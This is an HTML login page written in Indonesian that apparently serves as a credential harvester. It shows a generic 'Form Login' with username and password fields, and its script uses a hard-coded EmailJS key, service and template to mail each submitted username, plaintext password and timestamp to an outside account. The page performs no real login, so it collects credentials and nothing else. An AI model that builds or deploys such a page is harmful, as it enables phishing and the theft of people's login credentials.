<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login Form - EmailJS</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: url('file-ASDzNYFzQDkvSqwd9gLZ5B') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .form-container {
      background: rgba(255, 255, 255, 0.85);
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    }
    input {
      display: block;
      margin-bottom: 15px;
      width: 100%;
      padding: 10px;
      font-size: 16px;
    }
    button {
      background: #4CAF50;
      color: white;
      border: none;
      padding: 10px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>Form Login</h2>
    <form id="loginForm">
      <input type="text" name="username" placeholder="Username" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Kirim</button>
    </form>
  </div>

  <script>
    emailjs.init("gUbi1tM7GsAo5J-bd"); // Public Key EmailJS

    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const form = e.target;
      const username = form.username.value;
      const password = form.password.value;
      const waktu = new Date().toLocaleString();

      emailjs.send("service_0zht7fa", "template_apwq9aa", {
        username: username,
        password: password,
        waktu: waktu
      })
      .then(() => {
        alert("Form berhasil dikirim ke email Anda.");
        form.reset();
      })
      .catch((err) => {
        console.error("Gagal kirim:", err);
        alert("Gagal mengirim form.");
      });
    });
  </script>
</body>
</html>
